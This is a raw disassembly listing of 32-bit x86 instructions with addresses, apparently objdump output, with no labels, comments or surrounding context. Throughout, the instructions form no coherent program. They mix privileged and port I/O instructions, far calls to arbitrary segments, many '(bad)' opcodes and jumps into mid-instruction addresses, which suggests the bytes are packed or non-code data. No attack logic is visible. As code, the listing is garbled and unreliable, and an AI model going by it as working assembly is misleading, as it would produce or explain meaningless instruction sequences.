  4340c5:	imul   edx,DWORD PTR [eax-0x42],0x2611ee8f
  4340cc:	call   0x736e:0x85373bb7
  4340d3:	sbb    eax,0x5059635f
  4340d8:	add    bl,BYTE PTR [edx-0x2d]
  4340db:	xchg   edx,eax
  4340dc:	jmp    0x4340b1
  4340de:	and    eax,0x691f9375
  4340e3:	iret   
  4340e4:	pop    ebp
  4340e5:	nop
  4340e6:	cmp    al,0xf2
  4340e8:	lds    ebp,FWORD PTR ds:0x48627094
  4340ee:	mov    cl,0x20
  4340f0:	and    DWORD PTR [ecx-0x38],edi
  4340f3:	cmp    DWORD PTR ds:0xed127bff,edx
  4340f9:	dec    edi
  4340fa:	adc    ebx,DWORD PTR [ebp-0x27122caa]
  434100:	std    
  434101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434102:	xor    dh,BYTE PTR [ebx-0x49]
  434105:	jmp    0x434117
  434107:	loopne 0x43408c
  434109:	int3   
  43410a:	mov    ebx,0x7e59ab4
  43410f:	lahf   
  434110:	and    eax,0xb7ec41b6
  434115:	sub    eax,0x7094592c
  43411a:	mov    ecx,0x5189ff90
  43411f:	mov    ds:0x22919fbe,eax
  434124:	push   0xffffffbc
  434126:	pop    ebp
  434127:	mov    edx,0xf1268e25
  43412c:	or     edx,ecx
  43412e:	xchg   ebp,eax
  43412f:	and    al,0xb2
  434131:	leave  
  434132:	cdq    
  434133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434134:	adc    DWORD PTR [esi-0xde5c795],esi
  43413a:	std    
  43413b:	aas    
  43413c:	call   0x1b9c:0x8860bcce
  434143:	xchg   ebx,esp
  434145:	cs stos DWORD PTR es:[edi],eax
  434147:	neg    BYTE PTR [edx]
  434149:	jns    0x4341b8
  43414b:	xor    edx,DWORD PTR [ebx]
  43414d:	xor    edx,eax
  43414f:	fdivr  st(6),st
  434151:	xchg   ebx,eax
  434152:	cmp    al,0x8e
  434154:	jae    0x43413c
  434156:	ins    DWORD PTR es:[edi],dx
  434157:	push   0x2cbac43e
  43415c:	xchg   esi,eax
  43415d:	cld    
  43415e:	lock sub eax,DWORD PTR ds:0x7ce98479
  434165:	mov    edx,DWORD PTR [esp+edx*2+0x5d]
  434169:	pushf  
  43416a:	sbb    eax,esp
  43416c:	pop    ds
  43416d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43416e:	mov    DWORD PTR [ebx+edx*2+0x38],edi
  434172:	xor    BYTE PTR [ecx],cl
  434174:	and    eax,0xffffffdf
  434177:	inc    esp
  434178:	lea    ebx,[esi-0x607a710f]
  43417e:	cmp    ebx,DWORD PTR [esi-0x14]
  434181:	cmp    eax,0x72c3437b
  434186:	dec    eax
  434187:	mov    esp,DWORD PTR [bx+si-0x6c]
  43418b:	push   es
  43418c:	cli    
  43418d:	and    BYTE PTR [eax+0xb9e840c],bh
  434193:	(bad)  
  434194:	rol    DWORD PTR [eax+0x24],1
  434197:	sti    
  434198:	scas   al,BYTE PTR es:[edi]
  434199:	pop    ss
  43419a:	in     al,0x4
  43419c:	mov    esi,0x2a34b197
  4341a1:	daa    
  4341a2:	hlt    
  4341a3:	pop    ebp
  4341a4:	cmc    
  4341a5:	pop    esp
  4341a6:	shr    ecx,0x26
  4341a9:	sti    
  4341aa:	cmp    ebx,esi
  4341ac:	xchg   DWORD PTR [ecx-0x6813d6f9],ecx
  4341b2:	loop   0x434172
  4341b4:	scas   eax,DWORD PTR es:[edi]
  4341b5:	add    eax,0xbb58f9b1
  4341ba:	dec    ebp
  4341bb:	dec    ecx
  4341bc:	aad    0x56
  4341be:	adc    eax,0x5b7d7ff2
  4341c3:	push   ds
  4341c4:	loop   0x43419a
  4341c6:	mov    ecx,0xd0913da4
  4341cb:	shl    BYTE PTR [ebp-0x581093be],0xa8
  4341d2:	fst    DWORD PTR [edx]
  4341d4:	mov    ah,0x3c
  4341d6:	or     ch,BYTE PTR [esi+edx*2]
  4341d9:	fwait
  4341da:	lock sbb al,BYTE PTR [edi]
  4341dd:	lahf   
  4341de:	xchg   esp,eax
  4341df:	cmp    eax,DWORD PTR [ebx-0x3fecc45a]
  4341e5:	inc    ecx
  4341e6:	add    BYTE PTR [edi-0x3ff95fad],dh
  4341ec:	mov    bh,BYTE PTR ds:0xe98ce4ba
  4341f2:	(bad)  [ebp-0x43]
  4341f5:	mov    ds:0x5de01037,eax
  4341fa:	fst    DWORD PTR [edi+0x6c506924]
  434200:	xchg   ebp,eax
  434201:	sub    al,0x5
  434203:	fistp  WORD PTR [edx]
  434205:	mov    al,ds:0x597557cb
  43420a:	xchg   BYTE PTR [esi-0x40],ah
  43420d:	(bad)  
  43420e:	sti    
  43420f:	sahf   
  434210:	addr16 das 
  434212:	mov    esi,eax
  434214:	or     al,BYTE PTR [eax-0x6185274d]
  43421a:	retf   
  43421b:	xchg   BYTE PTR [ecx],dh
  43421d:	lds    esi,FWORD PTR [esi]
  43421f:	jns    0x4341d9
  434221:	mov    esi,0xab593b3e
  434226:	mov    eax,0xfad6d864
  43422b:	fst    QWORD PTR ds:0x8ef19aed
  434231:	les    ebp,FWORD PTR [edx]
  434233:	ja     0x434200
  434235:	and    BYTE PTR [ebx],0xfd
  434238:	mov    dl,0x34
  43423a:	mov    esp,0xfa9b2944
  43423f:	mov    DWORD PTR [esi+0x6e],0x55155ca2
  434246:	dec    ebx
  434247:	test   BYTE PTR [ebx],0x4
  43424a:	jmp    0x3c06748b
  43424f:	xchg   ebx,eax
  434250:	loopne 0x43428a
  434252:	out    dx,eax
  434253:	je     0x43425d
  434255:	and    edx,DWORD PTR [ebp+0x60]
  434258:	int    0x75
  43425a:	lods   eax,DWORD PTR ds:[esi]
  43425b:	aad    0xb1
  43425d:	jle    0x434263
  43425f:	add    al,0x21
  434261:	fsin   
  434263:	call   0x650c4ef8
  434268:	rcr    BYTE PTR [esi-0x6f115b4b],cl
  43426e:	jmp    0x434245
  434270:	ss leave 
  434272:	mul    BYTE PTR [edx+0x49]
  434275:	mov    ds:0x43cf2e0e,eax
  43427a:	ds push ss
  43427c:	fs xor esi,edx
  43427f:	les    ebx,FWORD PTR ds:0x8d73e1c4
  434285:	push   edx
  434286:	dec    ecx
  434287:	lock ins DWORD PTR es:[edi],dx
  434289:	mov    ds:0xe67a7e5b,eax
  43428e:	xchg   ecx,eax
  43428f:	jo     0x43430c
  434291:	into   
  434292:	and    al,0x3d
  434294:	mov    ecx,0xc64bf15
  434299:	add    al,0x8c
  43429b:	pmuludq mm3,QWORD PTR [edi-0x479d7b05]
  4342a2:	mov    eax,0x513bd92b
  4342a7:	test   eax,0x54b75a92
  4342ac:	mov    bh,0xf6
  4342ae:	push   ecx
  4342af:	or     BYTE PTR [ecx+0x49],cl
  4342b2:	shl    BYTE PTR [eax-0x75],cl
  4342b5:	jbe    0x434276
  4342b7:	aam    0xe7
  4342b9:	push   cs
  4342ba:	mov    dl,BYTE PTR [edi]
  4342bc:	push   0x1754b98b
  4342c1:	inc    esp
  4342c2:	push   DWORD PTR [edx-0x2a8b421a]
  4342c8:	and    eax,DWORD PTR [ebx+0x581510f1]
  4342ce:	sbb    DWORD PTR [ebp+eiz*1-0x1973e2d7],esi
  4342d5:	mov    esp,0x7e2a9287
  4342da:	dec    esi
  4342db:	jle    0x4342f6
  4342dd:	and    DWORD PTR [ebp+0x2bf245fd],ebx
  4342e3:	enter  0x54f1,0xbf
  4342e7:	aam    0xc1
  4342e9:	add    BYTE PTR [edx-0x61],bl
  4342ec:	lds    ebp,FWORD PTR [ebp-0x7b]
  4342ef:	jmp    0x4342e9
  4342f1:	loop   0x4342ea
  4342f3:	mov    bl,BYTE PTR [edi]
  4342f5:	mov    ecx,0xa6ecfa47
  4342fa:	aad    0xe9
  4342fc:	add    eax,0x71da6ba9
  434301:	pusha  
  434302:	enter  0x7d68,0xa3
  434306:	sbb    ebp,ebp
  434308:	ja     0x434388
  43430a:	xor    al,0xf8
  43430c:	mov    ah,0x84
  43430e:	dec    esi
  43430f:	imul   ebx
  434311:	cdq    
  434312:	in     eax,dx
  434313:	cld    
  434314:	popa   
  434315:	gs ins BYTE PTR es:[edi],dx
  434317:	pop    edi
  434318:	and    eax,0xaff18933
  43431d:	mov    dl,0x90
  43431f:	fnclex 
  434321:	call   0x4ee75dbf
  434326:	mov    ah,0x54
  434328:	or     DWORD PTR [ebp+edi*8+0x23],ebx
  43432c:	(bad)
  43432f:	out    0xc5,eax
  434331:	cmp    ecx,DWORD PTR [eax+0x3fb7ba48]
  434337:	xlat   BYTE PTR ds:[ebx]
  434338:	xor    ebx,DWORD PTR [ecx]
  43433a:	cli    
  43433b:	cmp    ebx,edi
  43433d:	sub    cl,BYTE PTR [edi-0x63c99fb3]
  434343:	adc    al,0x45
  434345:	js     0x43437c
  434347:	icebp  
  434348:	ds jns 0x4342da
  43434b:	inc    edi
  43434c:	and    ebp,DWORD PTR [ecx]
  43434e:	add    eax,0xc70494e7
  434353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434354:	mov    bh,0xc5
  434356:	add    dl,ah
  434358:	push   es
  434359:	pop    ecx
  43435a:	inc    esi
  43435b:	popa   
  43435c:	sbb    DWORD PTR [esp+ebp*2-0x36842d72],ebx
  434363:	cmp    DWORD PTR [ebx],ebx
  434365:	ss ins BYTE PTR es:[edi],dx
  434367:	fcomp  st(4)
  434369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43436a:	jmp    0x434313
  43436c:	jmp    FWORD PTR [esi+0x8e5bf53]
  434372:	(bad)  
  434374:	adc    ch,bh
  434376:	mov    ah,0xc
  434378:	push   ebx
  434379:	test   eax,0x80acceab
  43437e:	sar    BYTE PTR [edi+0x64],cl
  434381:	dec    bp
  434383:	test   BYTE PTR [edx+0x16dbc5a6],ah
  434389:	dec    eax
  43438a:	dec    edi
  43438b:	add    BYTE PTR [ebx],cl
  43438d:	je     0x434405
  43438f:	jmp    0x7690e809
  434394:	pop    ds
  434395:	dec    ecx
  434396:	mov    esp,0xe8c9910f
  43439b:	cs js  0x43433f
  43439e:	imul   ebp,DWORD PTR [edi+0x21],0xffffffcc
  4343a2:	shl    DWORD PTR [ebp+0x22],1
  4343a5:	sbb    eax,edx
  4343a7:	aam    0x1f
  4343a9:	sub    edx,esp
  4343ab:	fstp   TBYTE PTR [edx-0x5]
  4343ae:	retf   0x1c1
  4343b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4343b2:	jmp    0x4343fb
  4343b4:	pop    ebp
  4343b5:	call   0x7eeed3e8
  4343ba:	xchg   DWORD PTR [edx+0x69],esp
  4343bd:	adc    edi,DWORD PTR [ecx+ecx*8-0x3c]
  4343c1:	cmp    eax,0x8ee784c7
  4343c6:	rcr    ah,0x9e
  4343c9:	cdq    
  4343ca:	mov    ebx,0xcbc67e16
  4343cf:	test   esi,esp
  4343d1:	xchg   ah,al
  4343d3:	mov    WORD PTR [edx],?
  4343d5:	fmul   QWORD PTR [eax-0x409ae7ca]
  4343db:	xchg   esp,eax
  4343dc:	es sar bl,1
  4343df:	call   0xdc7b53f4
  4343e4:	sbb    DWORD PTR [ecx-0x3f],edx
  4343e7:	jmp    0x95ab:0x9c7a1917
  4343ee:	rcl    ch,0xf9
  4343f1:	cdq    
  4343f2:	mov    edi,edi
  4343f4:	inc    ebp
  4343f5:	add    eax,DWORD PTR [edx+0x5b]
  4343f8:	sub    ecx,esp
  4343fa:	push   ebp
  4343fb:	sbb    eax,0x54ba70dc
  434400:	mov    BYTE PTR [ecx+0x0],cl
  434403:	and    edx,DWORD PTR ds:0x64edc6af
  434409:	in     al,dx
  43440a:	pop    ds
  43440b:	lods   ax,WORD PTR ds:[esi]
  43440d:	mov    esp,0xb7870584
  434412:	mov    esp,0xa3a2dcbd
  434417:	fnstcw WORD PTR [edx]
  434419:	sub    DWORD PTR [ebx+0x16],ebp
  43441c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43441d:	lods   al,BYTE PTR ds:[esi]
  43441e:	mov    ecx,0x81e1e9
  434423:	loope  0x43443c
  434425:	jns    0x434402
  434427:	ret    
  434428:	(bad)  
  434429:	inc    edi
  43442a:	cmp    DWORD PTR [ebx-0x16],ecx
  43442d:	ret    
  43442e:	mov    ecx,0x3b9b8dad
  434433:	xchg   esi,eax
  434434:	or     DWORD PTR [edx-0xca5471],0xffffffe0
  43443b:	jnp    0x43449f
  43443d:	stos   BYTE PTR es:[edi],al
  43443e:	xchg   edi,eax
  43443f:	gs iret 
  434441:	mov    esi,0xa112ef3b
  434446:	(bad)  [edi-0x72b39b]
  43444c:	pop    ebx
  43444d:	pop    esp
  43444e:	scas   eax,DWORD PTR es:[edi]
  43444f:	rcl    DWORD PTR [edx],0x2a
  434452:	pop    eax
  434453:	and    al,0xa0
  434455:	call   0xf162:0x5bbf9f97
  43445c:	and    eax,0xffea5c2a
  434461:	lea    esi,[edx-0x29a7c959]
  434467:	aaa    
  434468:	lahf   
  434469:	push   ecx
  43446a:	mov    esp,0x268b7924
  43446f:	(bad)  
  434470:	xlat   BYTE PTR ds:[ebx]
  434471:	or     ah,dh
  434473:	mov    edi,0xf2dd5299
  434478:	xchg   edx,eax
  434479:	imul   ebp,DWORD PTR [edx+0x552e1639],0x88c9307c
  434483:	hlt    
  434484:	add    al,0x1b
  434486:	jns    0x434480
  434488:	loope  0x434490
  43448a:	scas   eax,DWORD PTR es:[edi]
  43448b:	daa    
  43448c:	jne    0x434424
  43448e:	ss repz (bad) 
  434491:	scas   al,BYTE PTR es:[edi]
  434492:	mov    al,ds:0xc469ac14
  434497:	rcl    DWORD PTR [edi-0x5a],1
  43449a:	ret    
  43449b:	and    dl,BYTE PTR [eax+0x17cb3705]
  4344a1:	or     esi,DWORD PTR [ebp-0x6d2fe246]
  4344a7:	repnz cmc 
  4344a9:	pop    es
  4344aa:	imul   edi,DWORD PTR [eax+0x3d],0xfed4c289
  4344b1:	push   eax
  4344b2:	jle    0x434470
  4344b4:	stos   BYTE PTR es:[edi],al
  4344b5:	mov    al,ds:0x508a843b
  4344ba:	call   0x1803:0x892d7706
  4344c1:	repz inc esp
  4344c3:	in     al,dx
  4344c4:	pop    ds
  4344c5:	jns    0x4344c9
  4344c7:	(bad)  
  4344c8:	mov    cl,0x5c
  4344ca:	mov    esi,0xbba7ea08
  4344cf:	adc    esi,DWORD PTR [ebx+0x73]
  4344d2:	loopne 0x434463
  4344d4:	aad    0xf5
  4344d6:	mov    ecx,DWORD PTR ds:0xa4bbb7da
  4344dc:	loope  0x4344a1
  4344de:	pusha  
  4344df:	retf   0xe5
  4344e2:	sbb    ecx,ebp
  4344e4:	(bad)  
  4344e5:	sub    edx,DWORD PTR [ebp+0x7]
  4344e8:	and    DWORD PTR [ecx-0x6],ebp
  4344eb:	(bad)  
  4344ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4344ee:	ret    0x8193
  4344f1:	mov    WORD PTR [edi+ebx*4-0x17],cs
  4344f5:	sbb    DWORD PTR [ebx-0x4078f8e8],ebp
  4344fb:	ss es jmp 0xff57f1cb
  434502:	and    eax,0x87254cd1
  434507:	sbb    eax,0xef9b9c36
  43450c:	lods   eax,DWORD PTR ds:[esi]
  43450d:	or     BYTE PTR [edi+0x58],0x79
  434511:	mov    esi,0x81bcf270
  434516:	call   0x9647a7f
  43451b:	add    esi,DWORD PTR [eax+0x4b18eba6]
  434521:	xor    eax,0xced1895f
  434526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434527:	sti    
  434528:	add    eax,DWORD PTR [ebp+0x2b]
  43452b:	in     eax,0x23
  43452d:	adc    al,0xa0
  43452f:	xor    eax,ebp
  434531:	jp     0x434546
  434533:	add    al,0x96
  434535:	loopne 0x43458b
  434537:	jg     0x43457f
  434539:	stc    
  43453a:	mov    dl,0x3d
  43453c:	pop    ss
  43453d:	(bad)  
  43453e:	mov    esi,gs
  434540:	and    edi,edx
  434542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434543:	push   ecx
  434544:	out    dx,eax
  434545:	repz mov eax,0xd656f014
  43454b:	xchg   si,ax
  43454d:	ins    BYTE PTR es:[edi],dx
  43454e:	jno    0x434551
  434550:	repz adc eax,0x5933611a
  434556:	add    BYTE PTR [eax-0xc],ch
  434559:	mov    al,ds:0xfd330842
  43455e:	mov    ebx,0xe3e90fe4
  434563:	aam    0x35
  434565:	(bad)  
  434567:	in     eax,0x30
  434569:	xor    BYTE PTR [eax+ebp*2+0x25],bl
  43456d:	mov    DWORD PTR [esi+0x475d042c],ebp
  434573:	ins    BYTE PTR es:[edi],dx
  434574:	nop
  434575:	pushf  
  434576:	imul   edx,DWORD PTR [edx-0x3d370bc],0x41
  43457d:	mov    ch,0xd2
  43457f:	jno    0x434562
  434581:	adc    edx,DWORD PTR [esi+eax*2-0x5b4cfc12]
  434588:	mov    WORD PTR [esi],?
  43458a:	dec    edi
  43458b:	mov    esi,0xe271418d
  434590:	call   0xaeee:0x7bea39b
  434597:	repz aaa 
  434599:	push   DWORD PTR [esp+eax*4-0x7ba2e0f]
  4345a0:	inc    esi
  4345a1:	cmp    DWORD PTR [ebp-0x3fab52ee],eax
  4345a7:	mov    ah,0x6a
  4345a9:	ja     0x4345e0
  4345ab:	fwait
  4345ac:	xor    al,0x33
  4345ae:	mov    cl,0x4
  4345b0:	mov    ds:0xd9de1f2,eax
  4345b5:	popf   
  4345b6:	sub    ebp,DWORD PTR [ecx-0x43c98f44]
  4345bc:	add    edx,DWORD PTR [eax+eiz*2-0xb]
  4345c0:	je     0x4345ac
  4345c2:	mov    ebp,0x777f4344
  4345c7:	stos   BYTE PTR es:[edi],al
  4345c8:	in     eax,0x7d
  4345ca:	mov    esi,0xe5efffe9
  4345cf:	sbb    ah,BYTE PTR [edx]
  4345d1:	sub    esp,esi
  4345d3:	(bad)  
  4345d5:	and    al,0xe8
  4345d7:	and    eax,0x129b9e6b
  4345dc:	imul   eax,DWORD PTR [esi-0x4616e19f],0xffffffd9
  4345e3:	xchg   ebx,eax
  4345e4:	xchg   ebx,eax
  4345e5:	xchg   DWORD PTR [eax+ebx*1-0x52],eax
  4345e9:	mov    ah,0x3f
  4345eb:	cmc    
  4345ec:	sub    eax,0x5872b1ab
  4345f1:	call   0x43eb:0xcc50347b
  4345f8:	rcl    BYTE PTR [edi],1
  4345fa:	xor    DWORD PTR [ebx-0x3b3b96a2],edx
  434600:	(bad)  
  434601:	retf   
  434602:	xchg   BYTE PTR [esi+0x21bac1d5],bl
  434608:	xchg   ebp,eax
  434609:	push   esi
  43460a:	or     eax,ebp
  43460c:	mov    ecx,0x18d99d09
  434611:	mov    ecx,0xf3b1e87d
  434616:	push   0xffffff9e
  434618:	outs   dx,DWORD PTR ds:[esi]
  434619:	test   eax,0x4935f0e2
  43461e:	popa   
  43461f:	jmp    0x4345c8
  434621:	neg    ah
  434623:	mov    fs,WORD PTR [ecx]
  434625:	or     ecx,ecx
  434627:	sar    bh,cl
  434629:	in     eax,dx
  43462a:	daa    
  43462b:	mov    bh,dl
  43462d:	int3   
  43462e:	xor    ah,BYTE PTR ds:0x215b6d06
  434634:	rol    edi,1
  434636:	daa    
  434637:	lahf   
  434638:	or     DWORD PTR [edi],edi
  43463a:	mov    edi,0xd1854c33
  43463f:	les    esi,FWORD PTR [eax-0x65]
  434642:	mov    bh,0x6d
  434644:	test   al,0x99
  434646:	jmp    0x434699
  434648:	hlt    
  434649:	cmp    al,0x73
  43464b:	add    BYTE PTR [esi],0x7b
  43464e:	xchg   DWORD PTR cs:[edx],esi
  434651:	test   eax,0x5023c331
  434656:	xor    eax,0x1f87de62
  43465b:	xchg   DWORD PTR ds:0xde9bb0c,edx
  434661:	and    al,0x96
  434663:	ficom  DWORD PTR [ecx+0x12c36399]
  434669:	repnz sar DWORD PTR [eax+0x77],1
  43466d:	adc    dh,BYTE PTR [esi-0x20706ab9]
  434673:	push   ecx
  434674:	pop    ds
  434675:	sbb    ebx,ebp
  434677:	pop    edi
  434678:	loope  0x434648
  43467a:	jmp    0x4346dd
  43467c:	sbb    bl,cl
  43467e:	popf   
  43467f:	sbb    ebp,edi
  434681:	mov    bh,0xbc
  434683:	xchg   esi,eax
  434684:	jmp    0x434650
  434686:	or     ebp,DWORD PTR [esi]
  434688:	push   0x1dfb0517
  43468d:	shl    DWORD PTR [ecx-0x11f6cdc2],cl
  434693:	(bad)  
  434694:	rol    BYTE PTR [ebx],0x10
  434697:	int    0x9b
  434699:	mov    dh,0x8a
  43469b:	jo     0x4346ec
  43469d:	pushf  
  43469e:	stc    
  43469f:	lds    bp,DWORD PTR [ebx+0x6915f373]
  4346a6:	mov    ds,WORD PTR [edi*8-0x7966a866]
  4346ad:	sub    DWORD PTR [edx-0x61],ebx
  4346b0:	sbb    BYTE PTR [ebx-0x77b17a0],dl
  4346b6:	pop    ebx
  4346b7:	ret    0x5810
  4346ba:	aam    0x67
  4346bc:	jno    0x43464b
  4346be:	cmp    edx,ebp
  4346c0:	push   esi
  4346c1:	shl    bh,1
  4346c3:	imul   ebx,DWORD PTR [ecx],0xeb64ba9b
  4346c9:	adc    esi,edx
  4346cb:	dec    esi
  4346cc:	cmc    
  4346cd:	sbb    eax,0x9229f3de
  4346d2:	push   ebp
  4346d3:	ja     0x4346f8
  4346d5:	pop    eax
  4346d6:	xor    esi,DWORD PTR [ecx]
  4346d8:	xchg   esp,eax
  4346d9:	cmc    
  4346da:	mov    cl,0x74
  4346dc:	adc    edx,ebx
  4346de:	pop    ebp
  4346df:	cmp    bh,ah
  4346e1:	mov    ax,ds:0x73bae523
  4346e7:	sahf   
  4346e8:	jg     0x43467d
  4346ea:	mov    ah,0x5c
  4346ec:	add    BYTE PTR [ebp+0x39897c0b],ch
  4346f2:	dec    ebx
  4346f3:	jl     0x434751
  4346f5:	icebp  
  4346f6:	sub    ah,ah
  4346f8:	cmp    BYTE PTR [ebx+0x5a3bee7b],al
  4346fe:	jae    0x4346b4
  434700:	and    DWORD PTR [ecx+0x77],edi
  434703:	stos   DWORD PTR es:[edi],eax
  434704:	cmp    BYTE PTR [esi+edi*8-0x5f5bb626],0xc2
  43470c:	jecxz  0x434727
  43470e:	in     al,0xac
  434710:	lods   eax,DWORD PTR ds:[esi]
  434711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434712:	xor    eax,esp
  434714:	xchg   edi,eax
  434715:	(bad)  
  434716:	lods   eax,DWORD PTR ds:[esi]
  434717:	in     eax,0xfe
  434719:	hlt    
  43471a:	mov    cl,0xb4
  43471c:	pop    eax
  43471d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43471e:	cdq    
  43471f:	mov    ch,0xc5
  434721:	and    DWORD PTR [ebp+0x152e1cee],esi
  434727:	push   cs
  434728:	xchg   ebx,eax
  434729:	imul   eax,DWORD PTR [ebp+0x3b3655b1],0xb141e957
  434733:	jmp    0x6a32dbf2
  434738:	neg    BYTE PTR ds:0xa1de052c
  43473e:	xchg   BYTE PTR [esi+ebx*1-0x62],bl
  434742:	mov    bh,BYTE PTR [eax-0x6d]
  434745:	out    0xb0,eax
  434747:	je     0x4346ca
  434749:	das    
  43474a:	push   esi
  43474b:	cwde   
  43474c:	and    eax,0xebf19681
  434751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434752:	sbb    BYTE PTR [eax+0x65c2e916],cl
  434758:	imul   eax,esp,0xa5cfe4f7
  43475e:	sbb    esp,DWORD PTR [edi+0x23]
  434761:	mov    eax,0x36b58838
  434766:	mov    dl,cl
  434768:	inc    ebp
  434769:	add    DWORD PTR [edx+0x2675a024],esi
  43476f:	mov    al,BYTE PTR [edi-0x4ae48dec]
  434775:	inc    ebp
  434776:	push   cs
  434777:	lock shr BYTE PTR [ecx+edi*2],1
  43477b:	inc    esi
  43477c:	cld    
  43477d:	pop    ebx
  43477e:	sbb    BYTE PTR [edi],dl
  434780:	and    ebp,DWORD PTR [ecx+0x6212c71a]
  434786:	and    al,BYTE PTR ss:0x2ff1a843
  43478d:	dec    esp
  43478e:	xchg   edi,eax
  43478f:	dec    edi
  434790:	and    cl,cl
  434792:	mov    eax,0x7d7eabf6
  434797:	push   0x68
  434799:	sbb    eax,0xe122bb5f
  43479e:	(bad)  
  4347a0:	or     esp,DWORD PTR [edi-0x57]
  4347a3:	cmp    dl,BYTE PTR [ecx+ecx*2-0x27bd58af]
  4347aa:	dec    edx
  4347ab:	aas    
  4347ac:	lea    ebp,[eax+0x2b4699bf]
  4347b2:	push   edi
  4347b3:	fadd   DWORD PTR [esi-0x240fec39]
  4347b9:	cmp    eax,0xe916e590
  4347be:	or     ah,ah
  4347c0:	inc    edx
  4347c1:	data16 jno 0x434816
  4347c4:	xlat   BYTE PTR ds:[ebx]
  4347c5:	mov    ds:0x9f5aee0b,al
  4347ca:	test   ch,ah
  4347cc:	lahf   
  4347cd:	sub    al,0x2c
  4347cf:	loop   0x434811
  4347d1:	stos   BYTE PTR es:[edi],al
  4347d2:	mov    cl,0xa4
  4347d4:	retf   0xde0d
  4347d7:	jge    0x43478e
  4347d9:	imul   ecx,DWORD PTR [esi],0xffffffe6
  4347dc:	dec    ecx
  4347dd:	popf   
  4347de:	adc    al,BYTE PTR [ebx-0x41]
  4347e1:	popf   
  4347e2:	and    ebp,0x803df91e
  4347e8:	ficom  DWORD PTR [esi-0x77]
  4347eb:	xor    ebx,DWORD PTR [edi]
  4347ed:	imul   edx,DWORD PTR [eax],0xbc7b8e55
  4347f3:	sub    DWORD PTR [edi],ebx
  4347f5:	pushf  
  4347f6:	imul   edx,DWORD PTR [edi-0x4482ca2d],0xffffffe0
  4347fd:	fisubr DWORD PTR [ebx]
  4347ff:	push   0x5c
  434801:	aam    0x2c
  434803:	adc    eax,0x3b03331f
  434808:	into   
  434809:	lahf   
  43480a:	retf   
  43480b:	ss loopne 0x43487c
  43480e:	in     eax,dx
  43480f:	pop    ebp
  434810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434811:	pop    es
  434812:	(bad)  
  434813:	or     ebp,DWORD PTR [eax-0x74]
  434816:	mov    al,0x94
  434818:	dec    edx
  434819:	add    ebp,esp
  43481b:	inc    ecx
  43481c:	push   esi
  43481d:	pop    edi
  43481e:	lahf   
  43481f:	and    eax,edx
  434821:	push   ebp
  434822:	push   es
  434823:	ins    DWORD PTR es:[edi],dx
  434824:	pop    esp
  434825:	xor    DWORD PTR [ecx],edi
  434827:	pop    edi
  434828:	and    cl,cl
  43482a:	test   al,0xdc
  43482c:	pop    ss
  43482d:	lds    eax,FWORD PTR [ebx]
  43482f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434830:	jp     0x43482a
  434832:	repnz cli 
  434834:	out    0x1d,al
  434836:	popf   
  434837:	and    DWORD PTR [eax-0x77],eax
  43483a:	les    edx,FWORD PTR ds:0x113c45d3
  434840:	scas   al,BYTE PTR es:[edi]
  434841:	mov    edx,DWORD PTR [ebp-0x46880208]
  434847:	adc    edi,ebx
  434849:	jmp    0x7bfb:0xc48b24b3
  434850:	call   0x194cc776
  434855:	xchg   DWORD PTR [esi+0x1e],edi
  434858:	sbb    al,0x59
  43485a:	outs   dx,BYTE PTR ds:[esi]
  43485b:	mov    ch,0xf2
  43485d:	jbe    0x434889
  43485f:	mov    bl,BYTE PTR [si-0x70]
  434863:	jmp    0x4347f6
  434865:	(bad)  
  434867:	(bad)  
  434868:	cmp    BYTE PTR [ebx-0x4a4f1321],ah
  43486e:	xchg   ecx,eax
  43486f:	shl    BYTE PTR [eax-0x41],0xbd
  434873:	xor    al,0x63
  434875:	xor    edx,DWORD PTR [edi+eiz*8]
  434878:	imul   DWORD PTR [ebx+0x24]
  43487b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43487c:	and    eax,0x3eea33fc
  434881:	daa    
  434882:	jmp    0x7936:0x910f06e5
  434889:	cmp    al,0xbf
  43488b:	call   0x9adee45f
  434890:	inc    esp
  434891:	pop    ecx
  434892:	jno    0x434864
  434894:	lods   al,BYTE PTR ds:[esi]
  434895:	ror    BYTE PTR [edi-0x63],1
  434898:	or     eax,0xfa059dc0
  43489d:	arpl   WORD PTR [esp+ecx*1+0x1d],dx
  4348a1:	fist   WORD PTR [ebx+0x62]
  4348a4:	add    ecx,ebp
  4348a6:	(bad)  
  4348a7:	fisubr WORD PTR [ebp+0x2b]
  4348aa:	out    dx,eax
  4348ab:	jmp    0x7c79:0x98678618
  4348b2:	rcl    cl,cl
  4348b4:	inc    ebp
  4348b5:	add    al,0xb4
  4348b7:	fcomp  QWORD PTR [ebx]
  4348b9:	jle    0x43484e
  4348bb:	jno    0x434861
  4348bd:	jg     0x43487e
  4348bf:	je     0x434870
  4348c1:	test   al,0xe8
  4348c3:	pop    ebp
  4348c4:	(bad)  
  4348c5:	pop    esp
  4348c6:	loopne 0x434894
  4348c8:	xchg   esp,eax
  4348c9:	push   ebp
  4348cb:	mov    eax,ds:0x1a4c6b81
  4348d0:	jle    0x43492b
  4348d2:	mov    ecx,0xb21d2d8e
  4348d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4348d8:	cmp    DWORD PTR [edx+ebx*1],esi
  4348db:	fidivr WORD PTR [eax]
  4348dd:	cmp    ah,dh
  4348df:	int3   
  4348e0:	lds    ecx,FWORD PTR [edx]
  4348e2:	pop    eax
  4348e3:	repnz pushf 
  4348e5:	aad    0x1e
  4348e7:	cmp    eax,0x94bcb50c
  4348ec:	fwait
  4348ed:	pop    ss
  4348ee:	std    
  4348ef:	test   DWORD PTR [esi],esp
  4348f1:	pop    es
  4348f2:	jp     0x4348b9
  4348f4:	inc    edi
